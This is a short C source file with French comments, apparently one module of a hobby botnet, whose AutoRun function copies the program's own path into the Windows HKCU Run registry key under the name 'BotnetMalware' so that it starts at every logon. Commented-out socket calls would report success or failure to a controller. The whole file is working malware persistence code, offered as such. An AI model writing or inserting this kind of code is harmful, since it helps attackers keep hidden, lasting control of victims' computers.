#include <windows.h>
#include <stdio.h>
#include "proto.h"

int AutoRun() // Fonction persistance Windows - Botnet Malware [AutoRun]//
{
	
	char err[128] = "Erreur de création de la persistance\n";
	char suc[128] = "Création de la persistance sur : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	// Permet de retrouver son propre nom, ainsi que son chemin 
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0) {
		//send(sock, err, sizeof(err), 0);
		return -1; 
	}

	HKEY NewVal;
	//Ouverture du registre et declaration d'un HKEY
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		//send(sock, err, sizeof(err), 0);
		return -1;
        //Insertion de la nouvelle valeur avec la donnée "BotnetMalware"
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath); // Création du nouvelle clée de registre -> Insérer dans regedit User\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
	if (RegSetValueEx(NewVal, TEXT("BotnetMalware"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		//send(sock, err, sizeof(err), 0);
		return -1;
	}
	//Fermeture du registre
	RegCloseKey(NewVal);
	//send(sock, suc, sizeof(suc), 0);
	return 0;
}